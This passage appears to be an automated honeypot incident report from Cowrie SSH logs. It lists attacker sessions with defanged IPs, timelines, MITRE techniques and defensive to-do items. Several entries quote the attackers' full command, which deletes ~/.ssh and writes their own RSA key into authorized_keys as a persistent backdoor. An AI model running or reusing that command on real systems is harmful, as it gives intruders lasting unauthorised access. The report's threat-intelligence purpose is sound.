| Time (UTC) | Event |
|---|---|
| `2026-05-13 21:40:31` | `cowrie.session.connect` |
| `2026-05-13 21:40:31` | `cowrie.client.version` |
| `2026-05-13 21:40:32` | `cowrie.client.kex` |
| `2026-05-13 21:40:32` | `cowrie.login.success` |
| `2026-05-13 21:40:33` | `cowrie.session.params` |
| `2026-05-13 21:40:33` | `cowrie.command.input` |
| `2026-05-13 21:40:33` | `cowrie.command.failed` |
| `2026-05-13 21:40:33` | `cowrie.log.closed` |
| `2026-05-13 21:40:33` | `cowrie.session.params` |
| `2026-05-13 21:40:33` | `cowrie.command.input` |
| `2026-05-13 21:40:33` | `cowrie.session.file_download` |
| `2026-05-13 21:40:33` | `cowrie.log.closed` |
| `2026-05-13 21:40:36` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `95.81.113[.]94` to AbuseIPDB if not already reported
- [ ] Block `95.81.113[.]94` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6f898f423d55

| Field | Detail |
|---|---|
| **Source IP** | `95.81.113[.]94` |
| **First Seen** | 2026-05-13 21:40 |
| **Last Seen** | 2026-05-13 21:40 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-13 21:40:35` | `cowrie.session.connect` |
| `2026-05-13 21:40:35` | `cowrie.client.version` |
| `2026-05-13 21:40:36` | `cowrie.client.kex` |
| `2026-05-13 21:40:36` | `cowrie.login.success` |
| `2026-05-13 21:40:36` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `95.81.113[.]94` to AbuseIPDB if not already reported
- [ ] Block `95.81.113[.]94` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9cc27800b95d

| Field | Detail |
|---|---|
| **Source IP** | `95.81.113[.]94` |
| **First Seen** | 2026-05-13 21:42 |
| **Last Seen** | 2026-05-13 21:42 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-13 21:42:12` | `cowrie.session.connect` |
| `2026-05-13 21:42:12` | `cowrie.client.version` |
| `2026-05-13 21:42:13` | `cowrie.client.kex` |
| `2026-05-13 21:42:13` | `cowrie.login.success` |
| `2026-05-13 21:42:14` | `cowrie.session.params` |
| `2026-05-13 21:42:14` | `cowrie.command.input` |
| `2026-05-13 21:42:14` | `cowrie.command.failed` |
| `2026-05-13 21:42:14` | `cowrie.log.closed` |
| `2026-05-13 21:42:14` | `cowrie.session.params` |
| `2026-05-13 21:42:14` | `cowrie.command.input` |
| `2026-05-13 21:42:14` | `cowrie.session.file_download` |
| `2026-05-13 21:42:14` | `cowrie.log.closed` |
| `2026-05-13 21:42:17` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `95.81.113[.]94` to AbuseIPDB if not already reported
- [ ] Block `95.81.113[.]94` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7330edc70ee8

| Field | Detail |
|---|---|
| **Source IP** | `95.81.113[.]94` |
| **First Seen** | 2026-05-13 21:42 |
| **Last Seen** | 2026-05-13 21:42 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-13 21:42:16` | `cowrie.session.connect` |
| `2026-05-13 21:42:16` | `cowrie.client.version` |
| `2026-05-13 21:42:17` | `cowrie.client.kex` |
| `2026-05-13 21:42:17` | `cowrie.login.success` |
| `2026-05-13 21:42:17` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `95.81.113[.]94` to AbuseIPDB if not already reported
- [ ] Block `95.81.113[.]94` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6c9ce51a8172

| Field | Detail |
|---|---|
| **Source IP** | `95.81.113[.]94` |
| **First Seen** | 2026-05-13 21:43 |
| **Last Seen** | 2026-05-13 21:43 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-13 21:43:49` | `cowrie.session.connect` |
| `2026-05-13 21:43:49` | `cowrie.client.version` |
| `2026-05-13 21:43:49` | `cowrie.client.kex` |
| `2026-05-13 21:43:50` | `cowrie.login.success` |
| `2026-05-13 21:43:50` | `cowrie.session.params` |
| `2026-05-13 21:43:50` | `cowrie.command.input` |
| `2026-05-13 21:43:50` | `cowrie.command.failed` |
| `2026-05-13 21:43:50` | `cowrie.log.closed` |
| `2026-05-13 21:43:50` | `cowrie.session.params` |
| `2026-05-13 21:43:50` | `cowrie.command.input` |
| `2026-05-13 21:43:51` | `cowrie.session.file_download` |
| `2026-05-13 21:43:51` | `cowrie.log.closed` |
| `2026-05-13 21:43:54` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `95.81.113[.]94` to AbuseIPDB if not already reported
- [ ] Block `95.81.113[.]94` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f2c2dbdcb100

| Field | Detail |
|---|---|
| **Source IP** | `95.81.113[.]94` |
| **First Seen** | 2026-05-13 21:43 |
| **Last Seen** | 2026-05-13 21:43 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-13 21:43:53` | `cowrie.session.connect` |
| `2026-05-13 21:43:53` | `cowrie.client.version` |
| `2026-05-13 21:43:53` | `cowrie.client.kex` |
| `2026-05-13 21:43:54` | `cowrie.login.success` |
| `2026-05-13 21:43:54` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `95.81.113[.]94` to AbuseIPDB if not already reported
- [ ] Block `95.81.113[.]94` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e5009962810e

| Field | Detail |
|---|---|
| **Source IP** | `95.81.113[.]94` |
| **First Seen** | 2026-05-13 21:45 |
| **Last Seen** | 2026-05-13 21:45 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-13 21:45:27` | `cowrie.session.connect` |
| `2026-05-13 21:45:27` | `cowrie.client.version` |
| `2026-05-13 21:45:27` | `cowrie.client.kex` |
| `2026-05-13 21:45:28` | `cowrie.login.success` |
| `2026-05-13 21:45:28` | `cowrie.session.params` |
| `2026-05-13 21:45:28` | `cowrie.command.input` |
| `2026-05-13 21:45:28` | `cowrie.command.failed` |
| `2026-05-13 21:45:28` | `cowrie.log.closed` |
| `2026-05-13 21:45:28` | `cowrie.session.params` |
| `2026-05-13 21:45:28` | `cowrie.command.input` |
| `2026-05-13 21:45:29` | `cowrie.session.file_download` |
| `2026-05-13 21:45:29` | `cowrie.log.closed` |
| `2026-05-13 21:45:32` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `95.81.113[.]94` to AbuseIPDB if not already reported
- [ ] Block `95.81.113[.]94` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7f33627a4d87

| Field | Detail |
|---|---|
| **Source IP** | `95.81.113[.]94` |
| **First Seen** | 2026-05-13 21:45 |
| **Last Seen** | 2026-05-13 21:45 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-13 21:45:31` | `cowrie.session.connect` |
| `2026-05-13 21:45:31` | `cowrie.client.version` |
| `2026-05-13 21:45:31` | `cowrie.client.kex` |
| `2026-05-13 21:45:32` | `cowrie.login.success` |
| `2026-05-13 21:45:32` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `95.81.113[.]94` to AbuseIPDB if not already reported
- [ ] Block `95.81.113[.]94` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d8450373cd41

| Field | Detail |
|---|---|
| **Source IP** | `144.79.187[.]21` |
| **First Seen** | 2026-05-13 21:47 |
| **Last Seen** | 2026-05-13 21:47 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-13 21:47:52` | `cowrie.session.connect` |
| `2026-05-13 21:47:52` | `cowrie.client.version` |
| `2026-05-13 21:47:52` | `cowrie.client.kex` |
| `2026-05-13 21:47:52` | `cowrie.login.success` |
| `2026-05-13 21:47:52` | `cowrie.session.params` |
| `2026-05-13 21:47:52` | `cowrie.command.input` |
| `2026-05-13 21:47:52` | `cowrie.command.failed` |
| `2026-05-13 21:47:53` | `cowrie.log.closed` |
| `2026-05-13 21:47:53` | `cowrie.session.params` |
| `2026-05-13 21:47:53` | `cowrie.command.input` |
| `2026-05-13 21:47:53` | `cowrie.session.file_download` |
| `2026-05-13 21:47:53` | `cowrie.log.closed` |
| `2026-05-13 21:47:55` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `144.79.187[.]21` to AbuseIPDB if not already reported
- [ ] Block `144.79.187[.]21` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8d03146f7064

| Field | Detail |
|---|---|
| **Source IP** | `144.79.187[.]21` |
| **First Seen** | 2026-05-13 21:47 |
| **Last Seen** | 2026-05-13 21:47 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-13 21:47:54` | `cowrie.session.connect` |
| `2026-05-13 21:47:54` | `cowrie.client.version` |
| `2026-05-13 21:47:54` | `cowrie.client.kex` |
| `2026-05-13 21:47:55` | `cowrie.login.success` |
| `2026-05-13 21:47:55` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `144.79.187[.]21` to AbuseIPDB if not already reported
- [ ] Block `144.79.187[.]21` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3fd8e7a299d7

| Field | Detail |
|---|---|
| **Source IP** | `95.81.113[.]94` |
| **First Seen** | 2026-05-13 21:48 |
| **Last Seen** | 2026-05-13 21:48 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-13 21:48:44` | `cowrie.session.connect` |
| `2026-05-13 21:48:44` | `cowrie.client.version` |
| `2026-05-13 21:48:44` | `cowrie.client.kex` |
| `2026-05-13 21:48:44` | `cowrie.login.success` |
| `2026-05-13 21:48:45` | `cowrie.session.params` |
| `2026-05-13 21:48:45` | `cowrie.command.input` |
| `2026-05-13 21:48:45` | `cowrie.command.failed` |
| `2026-05-13 21:48:45` | `cowrie.log.closed` |
| `2026-05-13 21:48:45` | `cowrie.session.params` |
| `2026-05-13 21:48:45` | `cowrie.command.input` |
| `2026-05-13 21:48:45` | `cowrie.session.file_download` |
| `2026-05-13 21:48:45` | `cowrie.log.closed` |
| `2026-05-13 21:48:49` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `95.81.113[.]94` to AbuseIPDB if not already reported
- [ ] Block `95.81.113[.]94` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c3544963acb9

| Field | Detail |
|---|---|
| **Source IP** | `95.81.113[.]94` |
| **First Seen** | 2026-05-13 21:48 |
| **Last Seen** | 2026-05-13 21:48 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-13 21:48:48` | `cowrie.session.connect` |
| `2026-05-13 21:48:48` | `cowrie.client.version` |
| `2026-05-13 21:48:48` | `cowrie.client.kex` |
| `2026-05-13 21:48:48` | `cowrie.login.success` |
| `2026-05-13 21:48:49` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `95.81.113[.]94` to AbuseIPDB if not already reported
- [ ] Block `95.81.113[.]94` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c40deb57acd8

| Field | Detail |
|---|---|
| **Source IP** | `156.245.246[.]50` |
| **First Seen** | 2026-05-13 21:52 |
| **Last Seen** | 2026-05-13 21:52 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-13 21:52:50` | `cowrie.session.connect` |
| `2026-05-13 21:52:50` | `cowrie.client.version` |
| `2026-05-13 21:52:50` | `cowrie.client.kex` |
| `2026-05-13 21:52:51` | `cowrie.login.success` |
| `2026-05-13 21:52:51` | `cowrie.session.params` |
| `2026-05-13 21:52:51` | `cowrie.command.input` |
| `2026-05-13 21:52:51` | `cowrie.command.failed` |
| `2026-05-13 21:52:51` | `cowrie.log.closed` |
| `2026-05-13 21:52:51` | `cowrie.session.params` |
| `2026-05-13 21:52:51` | `cowrie.command.input` |
| `2026-05-13 21:52:51` | `cowrie.session.file_download` |
| `2026-05-13 21:52:51` | `cowrie.log.closed` |
| `2026-05-13 21:52:54` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `156.245.246[.]50` to AbuseIPDB if not already reported
- [ ] Block `156.245.246[.]50` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7ad8c19f9512

| Field | Detail |
|---|---|
| **Source IP** | `156.245.246[.]50` |
| **First Seen** | 2026-05-13 21:52 |
| **Last Seen** | 2026-05-13 21:52 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-13 21:52:53` | `cowrie.session.connect` |
| `2026-05-13 21:52:53` | `cowrie.client.version` |
| `2026-05-13 21:52:53` | `cowrie.client.kex` |
| `2026-05-13 21:52:54` | `cowrie.login.success` |
| `2026-05-13 21:52:54` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `156.245.246[.]50` to AbuseIPDB if not already reported
- [ ] Block `156.245.246[.]50` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f77126cbfd17

| Field | Detail |
|---|---|
| **Source IP** | `155.4.245[.]222` |
| **First Seen** | 2026-05-13 21:54 |
| **Last Seen** | 2026-05-13 21:54 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-13 21:54:19` | `cowrie.session.connect` |
| `2026-05-13 21:54:19` | `cowrie.client.version` |
| `2026-05-13 21:54:19` | `cowrie.client.kex` |
| `2026-05-13 21:54:20` | `cowrie.login.success` |
| `2026-05-13 21:54:21` | `cowrie.session.params` |
| `2026-05-13 21:54:21` | `cowrie.command.input` |
| `2026-05-13 21:54:21` | `cowrie.command.failed` |
| `2026-05-13 21:54:22` | `cowrie.log.closed` |
| `2026-05-13 21:54:23` | `cowrie.session.params` |
| `2026-05-13 21:54:23` | `cowrie.command.input` |
| `2026-05-13 21:54:23` | `cowrie.session.file_download` |
| `2026-05-13 21:54:23` | `cowrie.log.closed` |
| `2026-05-13 21:54:28` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `155.4.245[.]222` to AbuseIPDB if not already reported
- [ ] Block `155.4.245[.]222` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-23899f6ce7bc

| Field | Detail |
|---|---|
| **Source IP** | `155.4.245[.]222` |
| **First Seen** | 2026-05-13 21:54 |
| **Last Seen** | 2026-05-13 21:54 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-13 21:54:27` | `cowrie.session.connect` |
| `2026-05-13 21:54:27` | `cowrie.client.version` |
| `2026-05-13 21:54:27` | `cowrie.client.kex` |
| `2026-05-13 21:54:28` | `cowrie.login.success` |
| `2026-05-13 21:54:28` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `155.4.245[.]222` to AbuseIPDB if not already reported
- [ ] Block `155.4.245[.]222` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1c44c1723d49

| Field | Detail |
|---|---|
| **Source IP** | `45.123.217[.]22` |
| **First Seen** | 2026-05-13 21:58 |
| **Last Seen** | 2026-05-13 21:58 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-13 21:58:10` | `cowrie.session.connect` |
| `2026-05-13 21:58:10` | `cowrie.client.version` |
| `2026-05-13 21:58:10` | `cowrie.client.kex` |
| `2026-05-13 21:58:10` | `cowrie.login.success` |
| `2026-05-13 21:58:10` | `cowrie.session.params` |
| `2026-05-13 21:58:10` | `cowrie.command.input` |
| `2026-05-13 21:58:10` | `cowrie.command.failed` |
| `2026-05-13 21:58:10` | `cowrie.log.closed` |
| `2026-05-13 21:58:11` | `cowrie.session.params` |
| `2026-05-13 21:58:11` | `cowrie.command.input` |
| `2026-05-13 21:58:11` | `cowrie.session.file_download` |
| `2026-05-13 21:58:11` | `cowrie.log.closed` |
| `2026-05-13 21:58:12` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.123.217[.]22` to AbuseIPDB if not already reported
- [ ] Block `45.123.217[.]22` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1da5cf9dfe3c

| Field | Detail |
|---|---|
| **Source IP** | `45.123.217[.]22` |
| **First Seen** | 2026-05-13 21:58 |
| **Last Seen** | 2026-05-13 21:58 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-13 21:58:12` | `cowrie.session.connect` |
| `2026-05-13 21:58:12` | `cowrie.client.version` |
